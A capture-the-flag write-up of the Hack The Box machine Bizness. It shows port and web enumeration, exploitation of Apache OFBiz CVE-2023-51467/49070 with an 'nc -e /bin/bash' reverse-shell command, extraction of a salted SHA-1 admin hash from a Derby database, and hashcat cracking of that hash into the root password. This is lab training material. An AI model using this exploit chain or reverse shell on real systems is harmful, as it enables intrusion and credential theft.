---
layout: writeup
category: HTB
description: Bizness is an easy machine in which we gain access by exploiting CVE-2023-51467 and CVE-2023-49070 vulnerabilitites of Apache Ofbiz. Then, we have to see in some files a hash with a salt that we have to crack and see the password for root.
points: 20
solves: 13171
tags: apache_ofbiz CVE-2023-51467 CVE-2023-49070 hash_cracking hash_salt su
date: 2024-05-24
title: HTB Bizness Writeup
comments: false
---

Bizness is an easy machine in which we gain access by exploiting CVE-2023-51467 and CVE-2023-49070 vulnerabilitites of Apache Ofbiz. Then, we have to see in some files a hash with a salt that we have to crack and see the password for root.

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.252
# Nmap 7.94SVN scan initiated Fri May 10 22:29:07 2024 as: nmap -p- --open -sS --min-rate 5000 -v -n -Pn -sVC -oN tcpTargeted 10.10.11.252
Nmap scan report for 10.10.11.252
Host is up (0.11s latency).
Not shown: 62788 closed tcp ports (reset), 2743 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
|_SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
|_http-title: Did not follow redirect to https://bizness.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|_  http/1.1
44559/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 10 22:29:43 2024 -- 1 IP address (1 host up) scanned in 35.88 seconds
```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)

## Web enumeration
            
First let's see the technologies used with whatweb:
```bash
❯ whatweb http://10.10.11.252
http://10.10.11.252 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.252], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: https://bizness.htb/ - no address for bizness.htb
```

We see that it redirects us to https://bizness.htb so let's add it to the /etc/hosts:

```bash
❯ echo '10.10.11.252 bizness.htb' | sudo tee -a /etc/hosts
10.10.11.252 bizness.htb
```

Now launch whatweb another time:

```bash
❯ whatweb https://bizness.htb
https://bizness.htb [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.10.11.252], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

If we fuzz for subdomains we don't find nothing:

```bash
❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.bizness.htb" -u https://bizness.htb --hh=169
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://bizness.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================


Total time: 0
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 0
```

# Access as ofbiz

So we only have this domain. Let's take a look in the browser:

![Main page](/assets/images/Bizness/main_page.png)

We can't see nothing interesting unless in the bottom where we can see it's apache ofbiz:

![Bottom of main page, we can see it's Apache Ofbiz](/assets/images/Bizness/bottom_apache_ofbiz.png)

Searching for vulnerabilities, we found this one:

![Important vulnerability in apache ofbiz](/assets/images/Bizness/important_vulnerability_apache_ofbiz.png)

Researching, we found [this exploit](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass):

Let's use it to gain a reverse shell:

```bash
❯ git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
Cloning into 'Apache-OFBiz-Authentication-Bypass'...
remote: Enumerating objects: 19, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 19 (delta 3), reused 7 (delta 1), pack-reused 5
Receiving objects: 100% (19/19), 51.44 MiB | 5.17 MiB/s, done.
Resolving deltas: 100% (3/3), done.
❯ cd Apache-OFBiz-Authentication-Bypass
❯ python3 exploit.py --url https://bizness.htb
[+] Scanning started...
[+] Apache OFBiz instance seems to be vulnerable.
```

It seems to be vulnerable so let's try to run a command to gain reverse shell access:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

```bash
❯ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.14.38 443'
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

And we receive the shell:

![Shell received](/assets/images/Bizness/shell_received.png)

Now stabilize the tty for doing ctrl+c and ctrl+l without problems:

```bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
ofbiz@bizness:/opt/ofbiz$ ^Z
[1]  + 75370 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 75370 continued  nc -lvnp 443
                                    reset xterm
ofbiz@bizness:/opt/ofbiz$ export TERM=xterm
ofbiz@bizness:/opt/ofbiz$ export SHELL=bash
ofbiz@bizness:/opt/ofbiz$ stty rows <YOUR ENTIRE WINDOW ROWS> columns <YOUR ENTIRE WINDOW COLUMNS>
```

# Access as root

Looking at the ofbiz configuration files, specifically looking for password files, we can see a lot of .dat files in the /opt/ofbiz/runtime/data/derby/seg0 directory. Doing a research about derby, we can see that is a type of database:

![Derby is a database](/assets/images/Bizness/derby_is_database.png)

Let's execute the strings command (because it's not human readable) in the files that grep detects password:

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ grep -i -r password . --text | strings
[..SNIP..]
./c54d0.dat:                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
[..SNIP..]
```

In the file c54d0.dat we can see that hashed password that hashcat can't detect:

```bash
❯ hashid '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
Analyzing '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
[+] Unknown hash
```

Looking at how this framework hash passwords [here](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java), we can see that first, in the function comparePassword looks how is it and depending, it jumps to another function:

![comparePassword function](/assets/images/Bizness/comparePasswordFunction.png)

As our hash starts with '$', let's jump to the doComparePosix function:

![doComparePosix function](/assets/images/Bizness/doComparePosixFunction.png)

It splits the hash with the string '$': the first part is the hashType, the second is the salt and the third are the bytes. Then, it passes this arguments to the function getCryptedBytes that the only thing that does is pass to the Base64.encodeBase64URLSafeString the hash:

![getCryptedBytes function](/assets/images/Bizness/getCryptedBytesFunction.png)

Researching about this function, we can see that it encodes like base64 but it replace '+' with '-' and '/' with '_':

![encodeBase64URLSafeString function](/assets/images/Bizness/encodeBase64URLSafeStringFunction.png)

Now that we now how this works, looking at the hashcat modes required to crack ha hashes that needs a salt, we can see that the format is bytes:salt and the bytes are in hex:

```bash
❯ hashcat --example-hashes | grep 'sha1' -A 10 -B 2

Hash mode #110
  Name................: sha1($pass.$salt)
  Category............: Raw Hash salted and/or iterated
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Generic
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: 848952984db93bdd2d0151d4ecca6ea44fcf49e3:30007548152
--

Hash mode #120
  Name................: sha1($salt.$pass)
  Category............: Raw Hash salted and/or iterated
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Generic
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: a428863972744b16afef28e0087fc094b44bb7b1:465727565
--
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: sha1$fe76b$02d5916550edf7fc8c886f044887f4b1abf9b013
  Example.Pass........: hashcat
  Benchmark.Mask......: ?b?b?b?b?b?b?b
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #125
  Name................: ArubaOS
--

Hash mode #130
  Name................: sha1(utf16le($pass).$salt)
  Category............: Raw Hash salted and/or iterated
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Generic
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: 0a9e4591f539a77cd3af67bae207d250bc86bac6:23240710432
[..SNIP..]
```

Now that we have the format, let's adequate the hash:

```bash
❯ echo -n 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I:d' | tr '_' '/' | tr '-' '+' | awk '{print $1}' FS=':' | base64 -d 2>/dev/null | xxd -ps | tr -d '\n' ; echo ':d'
b8fd3f41a541a435857a8f3e751cc3a91c174362:d
```

Now that we have the adequated hash, let's crack it:

```bash
❯ hashcat hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600G with Radeon Graphics, 2185/4435 MB (1024 MB allocatable), 4MCU

The following 15 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    110 | sha1($pass.$salt)                                          | Raw Hash salted and/or iterated
    120 | sha1($salt.$pass)                                          | Raw Hash salted and/or iterated
   4900 | sha1($salt.$pass.$salt)                                    | Raw Hash salted and/or iterated
   4520 | sha1($salt.sha1($pass))                                    | Raw Hash salted and/or iterated
  24300 | sha1($salt.sha1($pass.$salt))                              | Raw Hash salted and/or iterated
    140 | sha1($salt.utf16le($pass))                                 | Raw Hash salted and/or iterated
   4710 | sha1(md5($pass).$salt)                                     | Raw Hash salted and/or iterated
  21100 | sha1(md5($pass.$salt))                                     | Raw Hash salted and/or iterated
   4510 | sha1(sha1($pass).$salt)                                    | Raw Hash salted and/or iterated
   5000 | sha1(sha1($salt.$pass.$salt))                              | Raw Hash salted and/or iterated
    130 | sha1(utf16le($pass).$salt)                                 | Raw Hash salted and/or iterated
    150 | HMAC-SHA1 (key = $pass)                                    | Raw Hash authenticated
    160 | HMAC-SHA1 (key = $salt)                                    | Raw Hash authenticated
   5800 | Samsung Android Password/PIN                               | Operating System
    121 | SMF (Simple Machines Forum) > v1.1                         | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Sun May 26 10:46:49 2024
Stopped: Sun May 26 10:46:50 2024
```

It can't auto-detect the hash type, so let's try by ourselfs:

With mode 110, nothing:
```bash
❯ hashcat -m 110 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600G with Radeon Graphics, 2185/4435 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 110 (sha1($pass.$salt))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Sun May 26 10:47:27 2024 (3 secs)
Time.Estimated...: Sun May 26 10:47:30 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5905.1 kH/s (0.12ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 31%

Started: Sun May 26 10:47:27 2024
Stopped: Sun May 26 10:47:31 2024
```

But with mode 120:

```bash
❯ hashcat -m 120 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600G with Radeon Graphics, 2185/4435 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 120 (sha1($salt.$pass))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Sun May 26 10:45:02 2024 (1 sec)
Time.Estimated...: Sun May 26 10:45:03 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4800.3 kH/s (0.12ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1478656/14344385 (10.31%)
Rejected.........: 0/1478656 (0.00%)
Restore.Point....: 1476608/14344385 (10.29%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: moon789 -> monkey-moo
Hardware.Mon.#1..: Util: 31%

Started: Sun May 26 10:44:50 2024
Stopped: Sun May 26 10:45:04 2024
```

We have it! The password is monkeybizness, let's try it for root:

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su root
Password: 
root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0#
```

It works! Now we can see the flag:

```bash
root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# cd /root/
root@bizness:~# cat root.txt 
19****************************c5
root@bizness:~#
```

That's the machine, hope you liked it!
